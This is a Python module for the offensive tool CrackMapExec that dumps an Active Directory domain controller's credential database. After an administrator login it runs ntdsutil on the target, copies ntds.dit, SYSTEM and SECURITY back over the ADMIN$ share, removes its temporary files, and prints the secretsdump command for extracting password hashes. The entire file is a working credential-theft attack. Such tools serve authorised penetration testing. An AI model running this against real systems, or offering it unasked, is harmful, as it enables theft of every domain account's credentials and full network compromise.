import os

class CMEModule:
    '''
        Dump NTDS with ntdsutil
        Module by @zblurx

    '''
    name = 'ntdsutil'
    description = 'Dump NTDS with ntdsutil'
    supported_protocols = ['smb']
    opsec_safe= False
    multiple_hosts = False

    def options(self, context, module_options):
        '''
        Dump NTDS with ntdsutil
        Module by @zblurx

        DIR_RESULT  Local dir to write ntds dump
        '''
        self.share = "ADMIN$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
        self.dump_location = 'ntdsutil'
        self.dir_result = 'ntdsutil'

        if 'DIR_RESULT' in module_options:
            self.dir_result = module_options['DIR_RESULT']

        pass


    def on_admin_login(self, context, connection):
        command = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)
        context.log.info('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir,self.dump_location))
        context.log.debug('Executing command {}'.format(command))
        p = connection.execute(command, True)
        context.log.debug(p)
        if 'IFM media created successfully' in p:
            context.log.success("NTDS.dit dumped to %s%s" % (self.tmp_dir, self.dump_location))
        else:
            context.log.error("Error while dumping NTDS")
            return

        if not os.path.isdir(self.dir_result):
            os.makedirs(self.dir_result, exist_ok=True)

        context.log.info('Copy ntds.dit to host')
        with open(os.path.join(self.dir_result,'ntds.dit'), 'wb+') as dump_file:
            try:
                connection.conn.getFile(self.share, self.tmp_share + 'ntds.dit', dump_file.write)
                context.log.success('Copied NTDS dump into ntds.dit')
            except Exception as e:
                context.log.error('Error while get file: {}'.format(e))

        context.log.info('Copy ntds.jfm to host')
        with open(os.path.join(self.dir_result,'ntds.jfm'), 'wb+') as dump_file:
            try:
                connection.conn.getFile(self.share, self.tmp_share + 'ntds.jfm', dump_file.write)
                context.log.success('Copied NTDS dump into ntds.jfm')
            except Exception as e:
                context.log.error('Error while get file: {}'.format(e))

        context.log.info('Copy SYSTEM to host')
        with open(os.path.join(self.dir_result,'SYSTEM'), 'wb+') as dump_file:
            try:
                connection.conn.getFile(self.share, self.tmp_share + 'SYSTEM', dump_file.write)
                context.log.success('Copied NTDS dump into SYSTEM')
            except Exception as e:
                context.log.error('Error while get file: {}'.format(e))

        context.log.info('Copy SECURITY to host')
        with open(os.path.join(self.dir_result,'SECURITY'), 'wb+') as dump_file:
            try:
                connection.conn.getFile(self.share, self.tmp_share + 'SECURITY', dump_file.write)
                context.log.success('Copied NTDS dump into SECURITY')
            except Exception as e:
                context.log.error('Error while get file: {}'.format(e))

        try:
            command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
            p = connection.execute(command, True)
            context.log.success('Deleted %s%s dump directory on the %s share' % (self.tmp_dir, self.dump_location, self.share))
        except Exception as e:
            context.log.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))

        context.log.highlight("""Now simply:
        secretsdump.py -system %s/SYSTEM -security %s/SECURITY -ntds %s/ntds.dit LOCAL"""% (self.dir_result, self.dir_result, self.dir_result))
